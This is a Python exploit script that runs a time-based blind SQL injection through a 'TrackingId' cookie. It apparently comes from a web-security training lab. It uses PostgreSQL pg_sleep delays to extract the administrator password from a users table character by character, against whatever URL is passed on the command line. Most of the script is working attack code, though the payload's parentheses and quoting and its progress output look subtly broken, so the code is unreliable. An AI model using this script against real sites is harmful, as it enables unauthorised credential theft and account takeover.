import requests
import sys
import urllib3
import urllib
import re
from bs4 import BeautifulSoup

# Disable SSL/TLS warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure proxy settings if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_pass(url):
    password_extract =""
    for i in range(1,21):
        for j in range(32,126):
            sql_payload = " || SELECT CASE WHEN (username='administrator' AND ascii(SUBSTRING(password,%s,1)='%s')) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--" % (i, j)
            sqli_encode = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId':'KE5i5SrcTUN9mqOn'+ sqli_encode,'session':'9GjoLMmJJZA34Nq6MUGOrrHEGejzSbYu'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if int(r.elapsed.total_seconds())>10:
                 password_extract +=chr(j)
                 sys.stdout.write('\r'+password_extract+chr(j))
                 sys.stdout.flush()
                 break
            else:
                sys.stdout.write('\r'+password_extract+chr(j))
                sys.stdout.flush()

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] For Example: %s http://www.random.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) admin pass...........")
    sqli_pass(url)


if __name__ == "__main__":
    main()